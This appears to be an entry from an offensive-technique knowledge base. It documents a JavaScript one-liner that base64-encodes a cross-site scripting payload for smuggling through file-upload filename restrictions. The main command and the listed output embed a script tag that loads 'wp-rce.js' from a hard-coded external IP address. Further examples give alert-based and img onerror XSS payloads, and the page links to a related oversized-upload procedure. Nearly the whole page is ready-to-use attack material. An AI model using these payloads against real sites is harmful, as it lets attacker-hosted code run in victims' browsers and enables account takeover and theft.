---
data: >-
  btoa('Running POC<script type="text/javascript"
  src="http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js"></script>');
tags:
  - xss
  - encoding
type: command
executor: javascript
platforms:
  - Web
id: 92e54ef6-a974-4e5f-ab70-1a2178cc5468
created_at: '2025-12-14T03:46:37.601Z'
updated_at: '2025-12-14T03:46:37.601Z'
verified: false
validated: true
submitted: true
---
# btoa-encode-xss-payload

## Command

```javascript
btoa('Running POC<script type="text/javascript" src="http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js"></script>');
```

## Description

This JavaScript command uses the built-in btoa() function to base64-encode a string containing an XSS payload, allowing it to be embedded in a filename to bypass length or special character restrictions in upload interfaces.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| input_string | The string to encode, including script tags and external src | Yes |

## Examples

### Basic Usage

```javascript
btoa('Running POC<script type="text/javascript" src="http://example.com/script.js"></script>');
```

### Advanced Usage

```javascript
btoa('Custom payload with multiple tags <script>alert(1)</script><img src=x onerror=alert(2)>');
```

## Expected Output

Base64-encoded string, e.g., UnVubmluZyBQT0M8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vMTU5LjIwMy4xOTAuMTIzL3c5cmZhczg5ZXVmczllOGZ1OThld3VmandlZmlvandlX3MxMDU4Zy0vd3AtcmNlLmpzIj48L3NjcmlwdD4= for the POC payload.

## Related

- [[Related Procedure: Upload-Oversized-File-with-XSS-Payload]]
